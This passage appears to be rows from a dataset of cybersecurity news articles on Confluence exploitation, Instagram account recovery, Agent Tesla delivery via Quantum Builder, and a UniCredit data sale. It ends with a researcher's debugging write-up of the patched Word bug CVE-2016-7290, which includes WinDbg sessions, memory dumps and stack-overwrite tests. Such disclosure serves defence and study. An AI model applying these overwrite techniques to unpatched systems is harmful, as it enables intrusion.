BEHINDER, a file upload webshell, and the China Chopper webshell. According to Volexity, multiple threat actor groups are believed to be exploiting the vulnerability in real-world attacks. [1] https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html [2] https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html [3] https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/"
d4c50ac2-68e1-55c7-a41e-8a924f08cd03,26-September-2022,What happens with a hacked Instagram account – and how to recover it,A friend's Instagram account was hacked and she was locked out. The hackers added two-factor authentication to the account and changed the password. The hack was due to a simple password that was reused on other accounts. 2FA is free and easy to implement in all social media accounts.,"Had your Instagram account stolen? Don’t panic – here’s how to get your account back and how to avoid getting hacked (again) A friend – let’s call her Ellie – recently called me with a devastated tone in her voice. Her Instagram account had been hacked and she was locked out. Her panic was evident as she told me her password had been changed and that the hackers had added two-factor authentication (2FA) to the account. She went on to ask me if I knew of any tips to regain control. I had heard of both good and bad outcomes in similar situations, online, but I had never attempted it first-hand. If I’m honest, I was actually a little excited at the opportunity to test Instagram’s recovery methods to see if I could learn anything. Ellie is quite computer savvy and understands technology; however, she is also very busy with her small business and young children. As a result, she has simply “put off” adding extra security layers to her social media and email accounts. At any rate, when she called, I refrained from “I told you so!” and asked her what had happened. Ellie’s first mistake was that she had used a relatively simple password on the account and had reused it on other accounts , so this password was either compromised or attacked via brute force to gain illicit entry. Her second mistake was that her account was not to set up 2FA, which is free and easy to implement in all social media and email accounts. With this turned on, the hackers would have simply been turned away – even with entering the right password or clicking on the “forgotten password” link (a hacker’s favorite starting block!). Once into her account, they started the process of locking Ellie out by changing the password, adding 2FA to a Nigerian phone number and a different email address. Also, they added an authenticator app. Additionally, they even added some numbers to the end of the Instagram username, which, at first, I could not work out why. This is presumably done so Ellie would not simply be able to regain control from her phone, should she get that far. Once they had locked Ellie out, they started the next level of sideways attacks by sending messages to her Instagram friends, presumably to target their accounts and get their 2FA codes and multiply the hack. Luckily, no one else divulged the code but a few were immediately taken in by the messages. When Ellie tried to recover her account, she felt like she was at a dead end – even after following the steps on the Instagram help site , she felt stuck. When she requested a login link from Instagram to be sent to her primary email address, nothing genuine came through even though she could still access this account. (You will, of course, need access to the email address connected to your account. If for any reason you cannot access this email account, Instagram will not let you regain access to your Instagram profile.] I had remembered that hackers can often get into the associated emails via the same reused passcode, and then hide or block recovery emails sent from Instagram regarding the hacked accounts. To my (relative) shock, this was exactly what had happened. In her Yahoo account, she clicked on the “Blocked List” and three email addresses ending in mail.instagram.com had been blocked. Once unblocked, she followed the process again and Instagram sent another login link. She was then asked to submit a video selfie to help verify her identity (this was only possible as she has photos of herself on the account). RELATED READING: Attack of the Instagram clones Within 20 minutes, she received an email saying that she had now been granted access back into the account and given a small number of one-time recovery codes to use. We both thought we were on the road to victory! But it was short-lived. Although Ellie did regain access to the account by following the genuine link and typing in a backup code, the strangest thing is that she was instantly booted straight back out on entry. She retried this process five more times and this frustrating cycle reoccurred. She panicked, as she was only given six backup codes to use. To get more codes, she had to prove her identity again via the video selfie process … which did not work the next time, but after another attempt she passed and was given six more codes. Interestingly, however, Ellie’s email address started receiving emails purporting to be from Instagram but the grammar errors and strange requests for security codes looked phishy and, luckily, she ignored them. Presumably they could have locked her out of this account, but they wanted to keep her in to potentially hand over the One Time Passcodes (OTPs). I wondered if there could be a problem with her geo- or network location, or device, potentially banning her from entering the account, so I asked her to send the recovery email to my email address for me to try from my laptop at a location five miles away. I attempted the process on my laptop and much to her disbelief, I got in straight away and stayed in! Success! Ellie was overjoyed, but before I took a moment to work out why this attempt had worked, I decided to secure the account once and for all. I turned off the newly assigned 2FA app and the Nigerian phone number the hackers had changed it to; then, I changed the associated phone number to Ellie’s and then turned 2FA back on. I went on to change the password and used a 2FA code sent to her phone via SMS to prove she was now the secure owner of the account. Another thing the bad guys did was change Ellie’s username. This is presumably because when you log back into Instagram from your phone after logging out, it locks the login screen to the previous username and not an email address, making re-entry very tough unless it is still the original username tied to the app. To get Ellie back in, I had to change it back to her original username. While in her account, I visited her “Login Activity” and it asked me if my current login location was “me”. I clicked “yes” and it stored this location. My presumption on how she was instantly being booted out of the account is one of two possibilities. Firstly, they had potentially looked at recent login activity and struck off those locations, making Instagram think her home Wi-Fi was in fact a hacker’s location. Or secondly, the hackers were still in the account and every time Ellie attempted to use the backup codes, they were notified and used their associated 2FA to change the password once again before she could press on any further. Either way, using another IP address from a laptop and navigating the site quickly worked. Once she was back in, Ellie had a lot of replying to do with all the messaging that the hackers had done. Fascinatingly, anyone who replied stating they thought Ellie’s account had been hacked, or mentioned on their own stories that Ellie’s account had been hacked, had been blocked by the hackers too! Luckily, the whole process only took three days but it definitely felt longer for Ellie. She is back in now and after nearly giving up, she mentioned that she has learnt about account protection the hard way. And I will leave it in her words: “I wish I had followed this simple security advice beforehand”. BEFORE YOU GO: SnapHack: Watch out for those who can hack into anyone’s Snapchat! How I hacked my friend’s PayPal account"
9dc74881-2576-58d9-9769-179302a454c2,28-September-2022,Cyber Criminals Using Quantum Builder Sold on Dark Web to Deliver Agent Tesla Malware,"Malware builder called Quantum Builder is being used to deliver the Agent Tesla remote access trojan, researchers say. The tool is sold on the dark web for €189 a month and is used to generate shortcut files to deliver next-stage malware. The attack chain includes a spear-phishing email with a remote-access trojan.","A recently discovered malware builder called Quantum Builder is being used to deliver the Agent Tesla remote access trojan (RAT). ""This campaign features enhancements and a shift toward LNK (Windows shortcut) files when compared to similar attacks in the past,"" Zscaler ThreatLabz researchers Niraj Shivtarkar and Avinash Kumar said in a Tuesday write-up. Sold on the dark web for €189 a month, Quantum Builder is a customizable tool for generating malicious shortcut files as well as HTA, ISO, and PowerShell payloads to deliver next-stage malware on the targeted machines, in this case Agent Tesla . The multi-stage attack chain starts with a spear-phishing email containing a GZIP archive attachment that includes a shortcut designed to execute PowerShell code responsible for launching a remote HTML application (HTA) using MSHTA . The phishing emails purport to be an order confirmation message from a Chinese supplier of lump and rock sugar, with the LNK file masquerading as a PDF document. The HTA file, in turn, decrypts and executes another PowerShell loader script, which acts as a downloader for fetching the Agent Tesla malware and executing it with administrative privileges. In a second variant of the infection sequence, the GZIP archive is replaced by a ZIP file, while also adopting further obfuscation strategies to camouflage the malicious activity. Quantum Builder has witnessed a surge in usage in recent months, with threat actors using it to distribute a variety of malware, such as RedLine Stealer, IcedID, GuLoader, RemcosRAT, and AsyncRAT. ""Threat actors are continuously evolving their tactics and making use of malware builders sold on the cybercrime marketplace,"" the researchers said. ""This Agent Tesla campaign is the latest in a string of attacks in which Quantum Builder has been used to create malicious payloads in campaigns against various organizations."""
c814835b-4210-5f53-8998-ba010b781630,19-April,Unicredit employees database for sale on cyber-crime forums,"A threat actor posted a sale on a hacking and cyber-crime forum selling the database of UniCredit employees. UniCredit is an Italian bank with almost 100k employees worldwide. in the leak there are emails, phone, encrypted password, last name and first name of thousands of employees. the database appears to be genuine and leaked from late 2018-2019.","On the late afternoon of 19/04/2020, a threat actor posted a new sale on a hacking and cyber-crime forum selling the database of UniCredit employees. UniCredit S.p.A. is an Italian banking and a global financial services company. It is present on 17 countries and has almost 100k employees worldwide. While currently we are not aware how this potential data loss could have occurred, according to the actor post, in the leak there are information about thousand of employees, including emails, phone, encrypted password, last name and first name. We found the database being available on at least two cyber-crime and hacking related forum. The nickname of the user selling it is c0c0linoz , as evidences reported below: Data leaked is sold on the basis of a plan relating to the “ rows ” offered to the buyer . As showed, 150k rows is selled for 10k USD. According to the seller, it contains Unicredit data “ from late 2018-2019 “. The seller has publicly referred to an email address for the purchase negotiations, that is c0c0linoz at protonmail.com According to evidences acquired by others account linked to the seller, he/she claims to be from Romania , like reported in the following image: By the first technical details retrieved, the database appears to be genuine and the potential result of a SQL Injection attack. Alternatively, it could be the result of extensive compromise of the victim network with the dump of the database directly from one of the internal servers. For now, however, we have no evidence regarding such scenarios that could endorse or deny these hypotheses. By further investigating, we know c0c0linoz created new accounts on at least one cyber-crime related forum on 19/04/2020 specifically for this sale. Other related accounts on different forums suggest a much longer user history. Finally, the seller has shown some partial data in order to confirm the authenticity of the data in his/her possession and says that he/she will post further sample data after 24-36h from the first post. A temporal overlap compared to that reported by the seller (“ from late 2018-2019 “), could be represented by an incident that Unicredit suffered in the past. On 21 October 2018, indeed, Unicredit suffered a hacker attack that violated the data of customers participating in online banking services. In the immediacy of the incident, the largest Italian bank had promptly notified the violation of personal data, pursuant to art. 33 of the GDPR. Once again, however, despite the coincidence about the times, there is no actual evidence that the recent data leak is the result of that same attack."
323a63a3-c747-5937-87e7-abf0b759dbc9,13-December-2016,Word Up! Microsoft Word OneTableDocumentStream Underflow,"Microsoft has released a patch for a vulnerability in Microsoft Office 2010 Professional WinWord. The vulnerability affects Microsoft Word 2007 Service Pack 3, 2010 Service Pack 2 and other versions of the software. I found an integer underflow issue that triggers an out-of-bounds read condition. This could lead to a stack based buffer overflow outside of protected mode.","Today, Microsoft released the MS16–148 to patch CVE-2016-7290, which addresses an integer underflow issue that I found. The underflow later triggers an out-of-bounds read during a copy operation which could result in a stack based buffer overflow outside of the protected mode winword.exe process when a processing specially crafted binary document file. tl;dr; Whilst all that sounds dramatic, in reality the proof of concept (poc) only triggered an out-of-bounds read condition with the potential for information disclosure, however in this blog post I will detail the vulnerability further. The vulnerability affects Microsoft Word 2007 Service Pack 3, Microsoft Office 2010 Service Pack 2 (32-bit editions), Microsoft Office 2010 Service Pack 2 (64-bit editions) and Microsoft Office Compatibility Pack Service Pack 3. More details can be found in the SRC-2016-0042 advisory. All analysis was performed on Microsoft Office 2010 Professional WinWord.exe v14.0.4734.1000 , the latest patch at the time. First, let’s take a look at the differential of the sample and the poc files using our favorite binary editor 010 . What you may notice, is that there is only a single byte delta modification to the file. Using Offviz , we can take look and see which chunk contains the modification. The byte modification is within the data field of the OneTableDocumentStream chunk. The sample contains the byte value 0x68, however the poc uses 0xfa to trigger the underflow. Triggering the vulnerability First, I enable page heap and usermode stack traces for debugging purposes: c:\Program Files\Debugging Tools for Windows (x86)>gflags.exe -i winword.exe +hpa +ust Current Registry Settings for winword.exe executable are: 02001000 ust - Create user mode stack trace database hpa - Enable page heap c:\Program Files\Debugging Tools for Windows (x86)> Then running the poc.doc file results in the following access violation outside of protected mode: (880.ac4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00000000 ebx=00000000 ecx=00000033 edx=00000002 esi=22870ffd edi=002513c4 eip=744fb40c esp=0024c694 ebp=0024c69c iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210212 MSVCR90!memmove+0xfc: 744fb40c f3a5 rep movs dword ptr es:[edi],dword ptr [esi] 0:000> kvn # ChildEBP RetAddr Args to Child 00 0024c69c 5e3f9b36 002513bf 22870ff8 000000d3 MSVCR90!memmove+0xfc WARNING: Stack unwind information not available. Following frames may be wrong. 01 0024c6b0 5e413843 22870ff8 002513bf 000000d3 wwlib!DllGetClassObject+0x455a 02 0024c744 5e413223 002513ac 002513a0 00004ab8 wwlib!GetAllocCounters+0xcadb 03 00251230 5e4131c6 002513ac 002513a0 00004ab8 wwlib!GetAllocCounters+0xc4bb 04 00251264 5e45f414 002513ac 002513a0 00004ab8 wwlib!GetAllocCounters+0xc45e 05 00251280 5e8da8a7 002513a0 22872fe4 00000000 wwlib!GetAllocCounters+0x586ac 06 002512b8 5e89fdcb 04760520 002513a0 ffffffff wwlib!DllGetLCID+0x2d4521 07 002567f4 5e66e957 1b132948 04760098 00000000 wwlib!DllGetLCID+0x299a45 08 002580e0 5e671d5b 04760098 00258928 00000001 wwlib!DllGetLCID+0x685d1 09 00258584 5e671489 04760098 00258928 1b132948 wwlib!DllGetLCID+0x6b9d5 0a 0025894c 5e675c10 04760098 00002490 00000000 wwlib!DllGetLCID+0x6b103 0b 00258998 5e4a6ad4 04760098 1b132948 0000056e wwlib!DllGetLCID+0x6f88a 0c 002589d4 64270be6 22562f10 0000056e 00000000 wwlib!GetAllocCounters+0x9fd6c 0d 002589f8 64270ebd 18bea880 18bea998 00258aa8 MSPTLS!FsTransformBbox+0x279b3 0e 00258a4c 64270f2c 22798de8 00258d40 00000000 MSPTLS!FsTransformBbox+0x27c8a 0f 00258aec 64271196 00258d40 00000000 00000000 MSPTLS!FsTransformBbox+0x27cf9 10 00258ca0 6425736a 22798de8 227f0ca0 00000000 MSPTLS!FsTransformBbox+0x27f63 11 00258db4 6428aa6f 22826fd0 00000000 00000000 MSPTLS!FsTransformBbox+0xe137 12 00258eac 6426fbb9 22798de8 227f0ca0 00000000 MSPTLS!FsTransformBbox+0x4183c 13 00259000 6425684e 22798de8 00000000 00000000 MSPTLS!FsTransformBbox+0x26986 Doesn’t look so pretty without symbols does it? Investigating Accessed Memory The first thing I do is start checking out the memory that was accessed at the time of corruption. 0:000> !heap -p -a @esi address 22870ffd found in _DPH_HEAP_ROOT @ 61000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 227a13a8: 22870fe0 19 - 22870000 2000 67be8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 77126206 ntdll!RtlDebugAllocateHeap+0x00000030 770ea127 ntdll!RtlpAllocateHeap+0x000000c4 770b5950 ntdll!RtlAllocateHeap+0x0000023a 5de2d804 mso!Ordinal149+0x000074b0 5e6a754d wwlib!DllGetLCID+0x000a11c7 5e7debc2 wwlib!DllGetLCID+0x001d883c 5e41f313 wwlib!GetAllocCounters+0x000185ab 5e41ec32 wwlib!GetAllocCounters+0x00017eca 5e41eb57 wwlib!GetAllocCounters+0x00017def 5e41e72a wwlib!GetAllocCounters+0x000179c2 5e423d89 wwlib!GetAllocCounters+0x0001d021 5e6acca5 wwlib!DllGetLCID+0x000a691f 5e422aa0 wwlib!GetAllocCounters+0x0001bd38 5e43ed59 wwlib!GetAllocCounters+0x00037ff1 5e43ec61 wwlib!GetAllocCounters+0x00037ef9 5e48f0c3 wwlib!GetAllocCounters+0x0008835b 5e48f050 wwlib!GetAllocCounters+0x000882e8 5e4a6aba wwlib!GetAllocCounters+0x0009fd52 64270be6 MSPTLS!FsTransformBbox+0x000279b3 64270ebd MSPTLS!FsTransformBbox+0x00027c8a 64270f2c MSPTLS!FsTransformBbox+0x00027cf9 64271196 MSPTLS!FsTransformBbox+0x00027f63 6425736a MSPTLS!FsTransformBbox+0x0000e137 6428aa6f MSPTLS!FsTransformBbox+0x0004183c 6426fbb9 MSPTLS!FsTransformBbox+0x00026986 6425684e MSPTLS!FsTransformBbox+0x0000d61b 6426ad48 MSPTLS!FsTransformBbox+0x00021b15 6428573e MSPTLS!FsTransformBbox+0x0003c50b 64285910 MSPTLS!FsTransformBbox+0x0003c6dd 64285c7b MSPTLS!FsTransformBbox+0x0003ca48 6426b17a MSPTLS!FsTransformBbox+0x00021f47 0:000> !address @edi ProcessParametrs 00069738 in range 00069000 0006a000 Environment 02b233d8 in range 02b23000 02b24000 00160000 : 0023d000 - 00023000 Type 00020000 MEM_PRIVATE Protect 00000004 PAGE_READWRITE State 00001000 MEM_COMMIT Usage RegionUsageStack Pid.Tid 880.ac4 0:000> dd @esi 22870ffd ???????? ???????? ???????? ???????? 2287100d ???????? ???????? ???????? ???????? 2287101d ???????? ???????? ???????? ???????? 2287102d ???????? ???????? ???????? ???????? 2287103d ???????? ???????? ???????? ???????? 2287104d ???????? ???????? ???????? ???????? 2287105d ???????? ???????? ???????? ???????? 2287106d ???????? ???????? ???????? ???????? 0:000> [email protected] *4 Evaluate expression: 204 = 000000cc We can already see that this is an out-of-bounds read on a heap buffer that is 0x19 bytes in size, trying to copy an additional 204 bytes into @edi which is a stack based address. One might ask, what size is the stack variable? As it turns out, that stack variable is passed up the stack 6 frames down and seems dynamically calculated from a number of other variables and offsets. Incredibly hard to track without having symbols. Writing Memory If we can continue reading from @esi, then its safe to assume that we can continue writing. I know that is a huge assumption, but with the ability to ole spray the heap or gain precision of the heap using eps , it is likley that we can control the data at that offset. But what can we overwrite? Let’s take a look at the destination stack address: 0:000> !py mona do -a 002513c4 -s 0xcc Hold on... [+] Command used: !py mona.py do -a 002513c4 -s 0xcc ---------------------------------------------------- [+] Dumping object at 0x002513c4, 0xcc bytes [+] Preparing output file 'dumpobj.txt' - (Re)setting logfile dumpobj.txt [+] Generating module info table, hang on... - Processing modules - Done. Let's rock 'n roll. >> Object at 0x002513c4 (0xcc bytes): Offset Address Contents Info ------ ------- -------- ----- +00 0x002513c4 | 0x00000000 +04 0x002513c8 | 0x000bd62f +08 0x002513cc | 0x00002001 +0c 0x002513d0 | 0x0000ff00 +10 0x002513d4 | 0xd63b0000 +14 0x002513d8 | 0x8001000c +18 0x002513dc | 0xff000000 +1c 0x002513e0 | 0x0100ffff +20 0x002513e4 | 0x00000000 +24 0x002513e8 | 0x00000000 +28 0x002513ec | 0xffffffff +2c 0x002513f0 | 0x00000000 +30 0x002513f4 | 0x00000000 +34 0x002513f8 | 0x00000000 +38 0x002513fc | 0x00000000 +3c 0x00251400 | 0x00000000 +40 0x00251404 | 0xff000000 +44 0x00251408 | 0x00000000 +48 0x0025140c | 0xff000000 +4c 0x00251410 | 0x00000000 +50 0x00251414 | 0xff000000 +54 0x00251418 | 0x00000c48 +58 0x0025141c | 0xffffffff +5c 0x00251420 | 0x00000000 +60 0x00251424 | 0xff000000 +64 0x00251428 | 0x00000000 +68 0x0025142c | 0xff000000 +6c 0x00251430 | 0x00000000 +70 0x00251434 | 0x1b132948 ptr to 0x5e52ee80 : wwlib!GetAllocCounters+0x128118 +74 0x00251438 | 0xff000000 +78 0x0025143c | 0x00000000 +7c 0x00251440 | 0x00000000 +80 0x00251444 | 0x00000000 +84 0x00251448 | 0x00000000 +88 0x0025144c | 0x00000000 +8c 0x00251450 | 0xff000000 +90 0x00251454 | 0x00000000 +94 0x00251458 | 0x00000000 +98 0x0025145c | 0x00000000 +9c 0x00251460 | 0x00000000 +a0 0x00251464 | 0x00000000 +a4 0x00251468 | 0x00000000 +a8 0x0025146c | 0x00000000 +ac 0x00251470 | 0x00000000 +b0 0x00251474 | 0x00000000 +b4 0x00251478 | 0x00000000 +b8 0x0025147c | 0x00000000 +bc 0x00251480 | 0x00000000 +c0 0x00251484 | 0x00000000 +c4 0x00251488 | 0x00000000 +c8 0x0025148c | 0x00000000 Using @corelanc0d3r’s excellent mona plugin, we can dump the destination stack address using the remainder of the size for the copy and can see that we have a pointer to .text (wwlib!GetAllocCounters+0x128118) . If I had to guess correctly at this point, I would say that we are not supposed to overwrite this value. Therefore, we are likley overflowing a stack buffer (not by much). If we wanted to hit a return address, it wouldn’t happen until +0x1e8 of the destination address. Which, incase you were curious, is located here: ... +cc 0x00251490 | 0xff700000 +d0 0x00251494 | 0x00ffffff +d4 0x00251498 | 0x00000000 +d8 0x0025149c | 0x00000000 ... +1dc 0x002515a0 | 0x1b132be0 +1e0 0x002515a4 | 0x0000005e +1e4 0x002515a8 | 0x002515c4 ptr to self+0x00000200 +1e8 0x002515ac | 0x5e415bc1 wwlib!GetAllocCounters+0xee59 [+] This mona.py action took 0:00:01.669000 0:000> ub 0x5e415bc1 wwlib!GetAllocCounters+0xee41: 5e415ba9 5e pop esi 5e415baa 81fbffffff7f cmp ebx,7FFFFFFFh 5e415bb0 0f873e393c00 ja wwlib!DllGetLCID+0x1d316e (5e7d94f4) 5e415bb6 8b5508 mov edx,dword ptr [ebp+8] 5e415bb9 53 push ebx 5e415bba 50 push eax 5e415bbb 52 push edx 5e415bbc e8b9e9fdff call wwlib+0x457a (5e3f457a) We dont see it in the call stack, because its a fair frames up in the stack: 0:000> [email protected] Evaluate expression: 20248 = 00004f18 The next question is, how are we going to simulate continuing the execution? @bannedit wrote another excellent plugin called counterfeit that we can use to alloc a chunk (using VirtualAlloc ) in windbg and fill it with marked data. We can then go ahead and replace @esi with this value and continue the copy operation. 0:000> !py cf -a 2000 -f __ _____ .__ __ ____ ____ __ __ _____/ |_ ____________/ ____\____ |__|/ |_ _/ ___\/ _ \| | \/ \ __\/ __ \_ __ \ __\/ __ \| \ __\ \ \__( <_> ) | / | \ | \ ___/| | \/| | \ ___/| || | \___ >____/|____/|___| /__| \___ >__| |__| \___ >__||__| \/ \/ \/ \/ version 1.0 - bannedit Allocated memory @ 0x14130000 with RWX permissions. Filling memory... Finished filling memory. 0:000> dd 0x14130000 14130000 41414141 41414142 41414143 41414144 14130010 41414145 41414146 41414147 41414148 14130020 41414149 4141414a 4141414b 4141414c 14130030 4141414d 4141414e 4141414f 41414150 14130040 41414151 41414152 41414153 41414154 14130050 41414155 41414156 41414157 41414158 14130060 41414159 4141415a 4141415b 4141415c 14130070 4141415d 4141415e 4141415f 41414160 Now, we set @esi to be the 0x14130000 : 0:000> g (880.ac4): Access violation - code c0000005 (!!! second chance !!!) eax=00000000 ebx=00000000 ecx=00000033 edx=00000002 esi=22870ffd edi=002513c4 eip=744fb40c esp=0024c694 ebp=0024c69c iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210212 MSVCR90!memmove+0xfc: 744fb40c f3a5 rep movs dword ptr es:[edi],dword ptr [esi] 0:000> r @esi=0x14130000 ... 0:000> t eax=00000000 ebx=00000000 ecx=00000017 edx=00000002 esi=14130070 edi=00251434 eip=744fb40c esp=0024c694 ebp=0024c69c iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210212 MSVCR90!memmove+0xfc: 744fb40c f3a5 rep movs dword ptr es:[edi],dword ptr [esi] 0:000> dd @edi L1 00251434 1b132948 0:000> dds poi(@edi) L1 1b132948 5e52ee80 wwlib!GetAllocCounters+0x128118 0:000> u poi(poi(@edi)) wwlib!GetAllocCounters+0x6e3b0: 5e475118 55 push ebp 5e475119 8bec mov ebp,esp 5e47511b 56 push esi 5e47511c 8bf1 mov esi,ecx 5e47511e e814000000 call wwlib!GetAllocCounters+0x6e3cf (5e475137) 5e475123 f6450801 test byte ptr [ebp+8],1 5e475127 7407 je wwlib!GetAllocCounters+0x6e3c8 (5e475130) 5e475129 56 push esi 0:000> t eax=00000000 ebx=00000000 ecx=00000016 edx=00000002 esi=14130074 edi=00251438 eip=744fb40c esp=0024c694 ebp=0024c69c iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210212 MSVCR90!memmove+0xfc: 744fb40c f3a5 rep movs dword ptr es:[edi],dword ptr [esi] 0:000> dds poi(@edi-4) L1 4141415d ???????? We can see we overwrote the data pointer that points to a function with a potentially controlled value from @esi. Since @esi contains marked data, we know at what offset in @esi was used to overwrite the pointer. 0:000> ?0x5d-0x41 Evaluate expression: 28 = 0000001c 0:000> !py mona do -a 002513c4 -s 0x78 Hold on... [+] Command used: !py mona.py do -a 002513c4 -s 0x78 ---------------------------------------------------- [+] Dumping object at 0x002513c4, 0x78 bytes [+] Preparing output file 'dumpobj.txt' - (Re)setting logfile dumpobj.txt [+] Generating module info table, hang on... - Processing modules - Done. Let's rock 'n roll. >> Object at 0x002513c4 (0x78 bytes): Offset Address Contents Info ------ ------- -------- ----- +00 0x002513c4 | 0x41414141 = ASCII 'AAAA' +04 0x002513c8 | 0x41414142 = ASCII 'AAAB' +08 0x002513cc | 0x41414143 = ASCII 'AAAC' +0c 0x002513d0 | 0x41414144 = ASCII 'AAAD' +10 0x002513d4 | 0x41414145 = ASCII 'AAAE' +14 0x002513d8 | 0x41414146 = ASCII 'AAAF' +18 0x002513dc | 0x41414147 = ASCII 'AAAG' +1c 0x002513e0 | 0x41414148 = ASCII 'AAAH' +20 0x002513e4 | 0x41414149 = ASCII 'AAAI' +24 0x002513e8 | 0x4141414a = ASCII 'AAAJ' +28 0x002513ec | 0x4141414b = ASCII 'AAAK' +2c 0x002513f0 | 0x4141414c = ASCII 'AAAL' +30 0x002513f4 | 0x4141414d = ASCII 'AAAM' +34 0x002513f8 | 0x4141414e = ASCII 'AAAN' +38 0x002513fc | 0x4141414f = ASCII 'AAAO' +3c 0x00251400 | 0x41414150 = ASCII 'AAAP' +40 0x00251404 | 0x41414151 = ASCII 'AAAQ' +44 0x00251408 | 0x41414152 = ASCII 'AAAR' +48 0x0025140c | 0x41414153 = ASCII 'AAAS' +4c 0x00251410 | 0x41414154 = ASCII 'AAAT' +50 0x00251414 | 0x41414155 = ASCII 'AAAU' +54 0x00251418 | 0x41414156 = ASCII 'AAAV' +58 0x0025141c | 0x41414157 = ASCII 'AAAW' +5c 0x00251420 | 0x41414158 = ASCII 'AAAX' +60 0x00251424 | 0x41414159 = ASCII 'AAAY' +64 0x00251428 | 0x4141415a = ASCII 'AAAZ' +68 0x0025142c | 0x4141415b = ASCII 'AAA[' +6c 0x00251430 | 0x4141415c = ASCII 'AAA\' +70 0x00251434 | 0x4141415d = ASCII 'AAA]' +74 0x00251438 | 0xff000000 Exposure Looking at the call stack again, we are interested in the caller of memmove() . 0:000> kvn L2 # ChildEBP RetAddr Args to Child 00 0024c69c 5e3f9b36 002513bf 22870ff8 000000d3 MSVCR90!memmove+0xfc WARNING: Stack unwind information not available. Following frames may be wrong. 01 0024c6b0 5e413843 22870ff8 002513bf 000000d3 wwlib!DllGetClassObject+0x455a Using the Hex-Rays decompiler, we can see this function is simply a wrapper around memmove() and is called a lot within wwwlib. Also I renamed sub_316d9b16 to memmove_wrapper_1 for brevity. int __stdcall memmove_wrapper_1 ( void * Src , void * Dst , size_t Size ) { int result ; // [email protected] if ( Size > 0x7FFFFFFF ) result = MSO_1511 ( 1647603307 , 0 ); else result = ( int ) memmove ( Dst , Src , Size ); return result ; } If the size is larger than MAX_INT, an int overflow exception is raised. Additionally to that, there is no sanity checks on the size value to validate that it is smaller than the destination buffer. For exploitation purposes, we typically want to know how the memmove() accessed or called… To determine this, we set a breakpoint bp wwlib!DllGetClassObject+0x4554 "".printf \""calling memmove(%x, %x, %x);\\n\"", poi(@esp), poi(@esp+4), poi(@esp+8); gc"" and re-run the poc. calling memmove(271164, 26fb3c, e); calling memmove(271172, 26fb4a, f); calling memmove(271148, 2266efe0, 3); calling memmove(27114b, 2266efe3, 3); calling memmove(27114e, 2266efe6, 3); calling memmove(271151, 2266efe9, 3); calling memmove(271154, 2266efec, 3); calling memmove(271157, 2266efef, 4); calling memmove(27115b, 2266eff3, 5); calling memmove(27122e, 27115b, 5); calling memmove(27115b, 2266eff8, d3); (5f0.59c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00000000 ebx=00000000 ecx=00000033 edx=00000002 esi=2266effd edi=00271160 eip=744fb40c esp=0026c430 ebp=0026c438 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210212 MSVCR90!memmove+0xfc: 744fb40c f3a5 rep movs dword ptr es:[edi],dword ptr [esi] There are a number of calls using a source buffer which start with 0x2266ef XX and the destination seems to be consistant as well 0x002711 YY . This is suspicious of an erroneous loop that is calling memmove() multiple times. The way I like to determine this is to analyze the stack at each call to determine if it unique. Executing the ‘k’ command in windbg is not going to cut it, as we are all ready slowing down execution a lot with the above break point. I choose to use a quick little windbg plugin that mashes the return addresses together: from pykd import * mashed = 0 for frame in getStack (): mashed += frame . returnOffset print ""stack hash: 0x%x"" % mashed 0:000> !py sh stack hash: 0x199a6804c9 Now, we will add that to our breakpoint, take out the new line and add a space on the end, finally re-running it: 0:010> bu wwlib!DllGetClassObject+0x4554 "".printf \""calling memmove(%x, %x, %x); \"", poi(@esp), poi(@esp+4), poi(@esp+8); !py sh; gc"" 0:010> g ... calling memmove(190fa4, 18f97c, e); stack hash: 0x18a96a3a98 calling memmove(190fb2, 18f98a, f); stack hash: 0x18a96a3a98 calling memmove(190f88, 49d7fe0, 3); stack hash: 0x1847ab6993 calling memmove(190f8b, 49d7fe3, 3); stack hash: 0x1847ab6993 calling memmove(190f8e, 49d7fe6, 3); stack hash: 0x1847ab6993 calling memmove(190f91, 49d7fe9, 3); stack hash: 0x1847ab6993 calling memmove(190f94, 49d7fec, 3); stack hash: 0x1847ab6993 calling memmove(190f97, 49d7fef, 4); stack hash: 0x1847ab6993 calling memmove(190f9b, 49d7ff3, 5); stack hash: 0x1847ab6993 calling memmove(19106e, 190f9b, 5); stack hash: 0x1847ad8b4c calling memmove(190f9b, 49d7ff8, d3); stack hash: 0x1847ab6993 (7dc.71c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00000000 ebx=00000000 ecx=00000033 edx=00000002 esi=049d7ffd edi=00190fa0 eip=744fb40c esp=0018c270 ebp=0018c278 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210212 MSVCR90!memmove+0xfc: 744fb40c f3a5 rep movs dword ptr es:[edi],dword ptr [esi] It is safe to assume now that calls to memmove() with stack hash 0x1847ab6993 are within a loop! Impact Since the poc does not overflow a return address or anything that is later accessed and used during a write or copy operation, then it can be concluded that this vulnerability has very little impact. Microsoft patched this vulnerability as a “Microsoft Office Information Disclosure Vulnerability” which makes sense in the context that it was presented here. However, since we can overwrite a pointer to .text on the stack due to the overflow, it demonstrates that this vulnerability has the potential for much more of an impact had it been triggered using an alternate code path. Within sub_316f3232 , there are 525 calls to the memmove_wrapper_1() which indictates that it is highley likley that several code paths exist, in order to reach this vulnerability. Additionaly to that, none of the others functions in the call stack use the guard stack mitigation (/GS) which means that if the return address was overwritten, there is no operating system level mitigation enabled to mitigate against it. Conclusion Many complex vulnerabilities still exist within the Office codebase that can be hard to find. Often, even harder to determine the root cause analysis and develop exploits for and I think that if Microsoft had released the symbols I 